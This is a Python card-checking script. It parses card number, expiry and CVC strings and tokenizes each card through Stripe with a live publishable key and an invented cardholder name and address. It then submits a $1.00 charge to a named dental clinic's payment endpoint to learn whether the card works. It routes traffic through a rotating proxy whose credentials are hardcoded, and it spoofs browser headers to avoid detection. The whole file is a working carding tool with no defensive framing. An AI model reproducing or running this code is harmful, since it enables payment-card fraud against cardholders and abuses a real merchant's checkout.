import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'time_on_page=59237&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=efc0b92c-c241-4a97-92fd-63b4c7481b4c07959d&sid=cf233545-352b-4ebf-8309-32a2e37171630803e2&key=pk_live_y6enOgXdsUj2j3o2KDWAky5Y&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]=20{yy}&card[name]=Dao+Khao+Saard&card[address_line1]=Street+27&card[address_city]=New+York&card[address_state]=NY&card[address_zip]=10080&card[address_country]=US'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'brilliantsmilesmd.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://brilliantsmilesmd.com',
	    'referer': 'https://brilliantsmilesmd.com/payment/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'amount': '1.00',
	    'token': f'{tok}',
	}
	
	response = session.post(
	    'https://brilliantsmilesmd.com/system/processors/stripe/brilliantsmilesmd.com/processor.php',
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'"seller_message":"(.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
